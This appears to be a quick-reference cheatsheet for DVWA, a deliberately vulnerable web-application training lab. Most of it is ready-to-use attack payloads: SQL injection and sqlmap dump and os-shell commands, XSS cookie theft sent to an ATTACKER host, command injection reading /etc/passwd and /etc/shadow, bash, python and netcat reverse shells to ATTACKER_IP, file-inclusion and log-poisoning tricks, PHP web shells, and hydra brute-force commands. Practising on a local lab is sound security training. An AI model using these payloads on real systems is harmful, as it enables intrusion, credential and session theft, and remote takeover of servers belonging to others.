# DVWA - Quick Reference Cheatsheet

---

## Default Configuration

| Setting | Value |
|---------|-------|
| URL | `http://127.0.0.1/login.php` or `http://localhost:4280` |
| Username | `admin` |
| Password | `password` |
| DB Server | `127.0.0.1:3306` |
| DB User | `dvwa` |
| DB Password | `p@ssw0rd` |
| DB Name | `dvwa` |
| Config File | `config/config.inc.php` |

---

## Quick Commands

```bash
# Kali Linux
sudo apt install dvwa
sudo dvwa-start        # Starts on port 42001
sudo dvwa-stop

# Docker
docker compose up -d
docker compose logs
docker compose down

# Access setup page
http://127.0.0.1/setup.php
```

---

## Security Levels Comparison

| Module | Low | Medium | High | Impossible |
|--------|-----|--------|------|------------|
| SQLi | No filtering | `mysqli_real_escape_string` + `(int)` cast | LIMIT 1 + escaping | Prepared statements |
| XSS Reflected | No filtering | `strip_tags` | `htmlspecialchars` | `htmlspecialchars` + CSP |
| XSS Stored | No filtering | `mysqli_real_escape_string` | `htmlspecialchars` | `htmlspecialchars` |
| CSRF | No token | No token | Token check (flawed) | Token + old password |
| Command Injection | No filtering | Strips `&&` and `;` | Strips `|` `&` `-` `;` | `escapeshellarg` |
| File Upload | No validation | MIME type check | Allowlist + rename | Random name + reprocess |
| File Inclusion | No filtering | `http://` stripped | `http://` + `../` blocked | Whitelist only |
| Brute Force | No delay | 2s delay | 5s delay + CAPTCHA | Account lockout |

---

## SQL Injection Payloads

```bash
# Authentication bypass
admin' --
admin' #
admin'/*
' OR 1=1--
' OR '1'='1
" OR ""="
" OR 1=1--
' OR 1=1--
') OR ('1'='1

# Union-based extraction
' UNION SELECT NULL, NULL--
' UNION SELECT user(), NULL--
' UNION SELECT version(), NULL--
' UNION SELECT user, password FROM users--
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--

# Blind SQLi - Boolean based
' AND 1=1--    (true)
' AND 1=2--    (false)
' AND (SELECT COUNT(*) FROM users)>0--

# Blind SQLi - Time based
' AND IF(1=1, SLEEP(3), 0)--
' AND SLEEP(3)--

# Stacked queries
'; SELECT * FROM users--
```

---

## XSS Payloads

```bash
# Basic alerts
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>alert(String.fromCharCode(88,83,83))</script>

# Image/Event-based
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<video><source onerror=alert('XSS')>

# Cookie theft
<script>new Image().src="http://ATTACKER/steal?c="+document.cookie;</script>
<script>fetch('http://ATTACKER/steal?c='+document.cookie)</script>

# Medium level bypass
<scr<script>ipt>alert('XSS')</script>
<ImG sRc=x oNeRrOr=alert('XSS')>
<details open ontoggle=alert('XSS')>

# DOM XSS
#<script>alert('XSS')</script>
#<img src=x onerror=alert('XSS')>
```

---

## Command Injection Payloads

```bash
# Basic separators
; cat /etc/passwd
| cat /etc/passwd
& cat /etc/passwd
&& cat /etc/passwd
|| cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)

# Newlines (URL encoded)
%0acat /etc/passwd

# Reverse shell
; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
| bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Reverse shell variants
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
; nc -e /bin/sh ATTACKER PORT

# File operations
; cat /etc/shadow
; ls -la /
; whoami
; id
; uname -a

# Medium level bypass (&& and ; removed)
| cat /etc/passwd
|| cat /etc/passwd
%0acat /etc/passwd
```

---

## File Inclusion Payloads

```bash
# LFI - /etc/passwd
?page=../../../../../../../etc/passwd
?page=....//....//....//etc/passwd

# PHP wrappers
?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php
?page=php://input    (POST: <?php system($_GET['c']); ?>)
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+

# RFI
?page=http://ATTACKER/shell.txt
?page=http://ATTACKER/shell.txt%00

# Null byte (PHP < 5.3.4)
?page=../../../../etc/passwd%00

# Log poisoning
?page=../../var/log/apache2/access.log
(User-Agent: <?php system($_GET['c']); ?>)
```

---

## File Upload Bypass

```bash
# Low level: Just upload a PHP shell
# shell.php content:
<?php system($_GET['cmd']); ?>

# Medium level bypass:
# Change Content-Type in request to: image/jpeg
# Or use double extension: shell.php.jpg
# Or use null byte: shell.php%00.jpg

# High level bypass:
# Use allowed extensions: shell.phtml, shell.php5
# Upload as: shell.php.jpg.php

# Access uploaded shell:
curl "http://127.0.0.1/hackable/uploads/shell.php?cmd=id"
curl "http://127.0.0.1/hackable/uploads/shell.php?cmd=cat+/etc/passwd"
```

---

## Brute Force Commands

```bash
# Hydra - Basic
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    127.0.0.1 http-post-form \
    "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed"

# Hydra - With cookies (for medium/high)
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    127.0.0.1 http-post-form \
    "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed:PHPSESSID=abc123;security=low"

# Hydra - Multiple users
hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt \
    127.0.0.1 http-post-form \
    "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

---

## sqlmap Commands

```bash
# Basic SQLi testing
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=abc123;security=low" --batch

# Dump database
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=abc123;security=low" -D dvwa --dump-all

# POST-based injection
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/" \
    --data="id=1&Submit=Submit" \
    --cookie="PHPSESSID=abc123;security=low" --batch

# With tamper scripts
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=abc123;security=low" --tamper=space2comment --batch

# Get OS shell
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=abc123;security=low" --os-shell
```

---

## Cookie/Session Manipulation

```bash
# DVWA cookie structure
PHPSESSID=your_session_id; security=low

# Change security level via cookie
# In browser console:
document.cookie = "security=low; path=/";

# Using curl
curl -b "PHPSESSID=abc123; security=low" "http://127.0.0.1/vulnerabilities/sqli/"
```

---

## Troubleshooting

```bash
# Service not starting
sudo systemctl status dvwa.service
sudo systemctl start dvwa.service

# Database connection issues
sudo systemctl status mariadb
sudo systemctl start mariadb
mysql -u dvwa -pp@ssw0rd -D dvwa

# Docker issues
docker compose logs
docker compose down && docker compose up -d --build

# Permission issues
chmod -R 777 hackable/uploads/

# Check Apache logs
sudo tail -f /var/log/apache2/error.log
```
